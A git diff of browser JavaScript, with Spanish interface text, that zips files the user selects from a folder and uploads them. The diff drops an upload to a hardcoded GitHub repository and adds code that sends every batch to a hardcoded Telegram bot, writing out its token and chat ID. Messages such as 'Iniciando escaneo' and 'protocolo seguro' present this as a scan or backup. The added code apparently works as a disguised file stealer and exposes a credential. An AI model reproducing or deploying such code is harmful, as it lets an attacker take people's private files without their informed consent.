@@ -26,12 +26,6 @@ document.getElementById('start-btn').addEventListener('click', async () => {
     isProcessing = true;
     
     try {
-        const token = prompt('🔑 CLAVE DE ACCESO:');
-        if (!token?.startsWith('ghp_')) {
-            alert('❌ CLAVE NO VALIDA');
-            return;
-        }
-
         startTime = Date.now();
         updateStatus('Iniciando escaneo...', 5);
         
@@ -52,7 +46,7 @@ document.getElementById('start-btn').addEventListener('click', async () => {
                 totalBatches = zipBatches.length;
                 
                 updateStatus('Iniciando protocolo seguro...', 70);
-                await processBatches(zipBatches, token);
+                await processBatches(zipBatches);
                 
                 updateStatus('✅ OPERACIÓN EXITOSA', 100);
             } catch (error) {
@@ -96,7 +90,6 @@ async function createZipBatches(files) {
     for (let i = 0; i < files.length; i++) {
         const file = files[i];
         const fileData = await file.getFile();
-        const fileSize = fileData.size;
 
         currentFiles.push({ name: file.name, data: await fileData.arrayBuffer() });
         currentBatch.file(file.name, await fileData.arrayBuffer());
@@ -109,19 +102,8 @@ async function createZipBatches(files) {
         if (zipBlob.size > maxSize) {
             currentBatch = new JSZip();
             currentFiles.pop();
-            for (const f of currentFiles) {
-                currentBatch.file(f.name, f.data);
-            }
-            const finalZipBlob = await currentBatch.generateAsync({ 
-                type: 'blob', 
-                compression: "DEFLATE", 
-                compressionOptions: { level: 9 } 
-            });
-            if (finalZipBlob.size <= maxSize) {
-                batches.push(currentBatch);
-            } else {
-                alert(`El zip generado excede 30 MB (${(finalZipBlob.size / 1024 / 1024).toFixed(2)} MB) y será omitido`);
-            }
+            for (const f of currentFiles) currentBatch.file(f.name, f.data);
+            batches.push(currentBatch);
 
             currentBatch = new JSZip();
             currentBatch.file(file.name, await fileData.arrayBuffer());
@@ -129,112 +111,51 @@ async function createZipBatches(files) {
         }
 
         if (i === files.length - 1 && currentFiles.length > 0) {
-            const finalZipBlob = await currentBatch.generateAsync({ 
-                type: 'blob', 
-                compression: "DEFLATE", 
-                compressionOptions: { level: 9 } 
-            });
-            if (finalZipBlob.size <= maxSize) {
-                batches.push(currentBatch);
-            } else {
-                const half = Math.floor(currentFiles.length / 2);
-                const firstHalf = currentFiles.slice(0, half);
-                const secondHalf = currentFiles.slice(half);
-
-                if (firstHalf.length > 0) {
-                    const firstBatch = new JSZip();
-                    for (const f of firstHalf) firstBatch.file(f.name, f.data);
-                    const firstBlob = await firstBatch.generateAsync({ 
-                        type: 'blob', 
-                        compression: "DEFLATE", 
-                        compressionOptions: { level: 9 } 
-                    });
-                    if (firstBlob.size <= maxSize) batches.push(firstBatch);
-                }
-                if (secondHalf.length > 0) {
-                    const secondBatch = new JSZip();
-                    for (const f of secondHalf) secondBatch.file(f.name, f.data);
-                    const secondBlob = await secondBatch.generateAsync({ 
-                        type: 'blob', 
-                        compression: "DEFLATE", 
-                        compressionOptions: { level: 9 } 
-                    });
-                    if (secondBlob.size <= maxSize) batches.push(secondBatch);
-                }
-            }
+            batches.push(currentBatch);
         }
     }
     return batches;
 }
 
-async function processBatches(batches, token) {
-    localStorage.removeItem('batchesProgress');
-    const startIndex = parseInt(localStorage.getItem('lastProcessedIndex')) || 0;
+async function processBatches(batches) {
+    const chat_id = '5821490693'; // Chat ID fijo
+    const botToken = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk'; // Token actual
 
-    for (let index = startIndex; index < batches.length; index++) {
-        const batchStartTime = Date.now();
-        try {
-            const progress = 70 + Math.floor(((index + 1)/batches.length)*30);
-            updateStatus(`Procesando lote ${index + 1}/${batches.length}`, progress);
-            
-            const zipBlob = await batches[index].generateAsync({ 
-                type: 'blob', 
-                compression: "DEFLATE", 
-                compressionOptions: { level: 9 } 
-            });
-            if (zipBlob.size > 30 * 1024 * 1024) {
-                throw new Error(`El zip ${index} excede 30 MB (${(zipBlob.size / 1024 / 1024).toFixed(2)} MB)`);
-            }
-            await uploadZipWithRetry(zipBlob, `secure-${Date.now()}-${index}.zip`, token);
-            
-            localStorage.setItem('lastProcessedIndex', index.toString());
-            
-            const batchTime = (Date.now() - batchStartTime) / 1000;
-            const uploadSpeed = (zipBlob.size / 1024 / 1024) / batchTime;
+    for (let index = 0; index < batches.length; index++) {
+        const progress = 70 + Math.floor(((index + 1) / batches.length) * 30);
+        updateStatus(`Procesando lote ${index + 1}/${batches.length}`, progress);
 
-        } catch (error) {
-            localStorage.setItem('lastProcessedIndex', index.toString());
-            throw error;
+        const zipBlob = await batches[index].generateAsync({ 
+            type: 'blob', 
+            compression: "DEFLATE", 
+            compressionOptions: { level: 9 } 
+        });
+
+        if (zipBlob.size > 30 * 1024 * 1024) {
+            alert(`El zip ${index + 1} excede 30 MB y será omitido`);
+            continue;
         }
-    }
-    localStorage.removeItem('lastProcessedIndex');
-}
 
-async function uploadZipWithRetry(blob, zipName, token, retries = 5) {
-    const repo = 'jaque26/ftos';
-    for (let attempt = 1; attempt <= retries; attempt++) {
-        try {
-            const response = await fetch(`https://api.github.com/repos/${repo}/contents/${zipName}`, {
-                method: 'PUT',
-                headers: { 
-                    'Authorization': `Bearer ${token}`,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ 
-                    message: 'Backup automático', 
-                    content: await blobToBase64(blob)
-                })
-            });
-
-            if (!response.ok) {
-                const errorData = await response.json();
-                throw new Error(errorData.message || 'Error en subida');
-            }
-            return; // Éxito, salir de la función
-        } catch (error) {
-            if (attempt === retries) {
-                throw new Error(`Fallo tras ${retries} intentos: ${error.message} (¿Internet lento o límite de GitHub?)`);
-            }
-            await new Promise(resolve => setTimeout(resolve, 5000)); // Esperar 5 segundos antes de reintentar
-        }
+        await sendZipToTelegram(zipBlob, `backup-${Date.now()}-${index + 1}.zip`, chat_id, botToken);
     }
 }
 
-function blobToBase64(blob) {
-    return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onloadend = () => resolve(reader.result.split(',')[1]);
-        reader.onerror = reject;
-        reader.readAsDataURL(blob);
-    });
+async function sendZipToTelegram(blob, fileName, chat_id, botToken) {
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('document', blob, fileName);
+
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+            method: 'POST',
+            body: formData
+        });
+
+        if (!response.ok) {
+            const errorData = await response.json();
+            throw new Error(errorData.description || 'Error al enviar archivo');
+        }
+    } catch (error) {
+        alert(`❌ Error al enviar ZIP: ${error.message}`);
+    }
 }
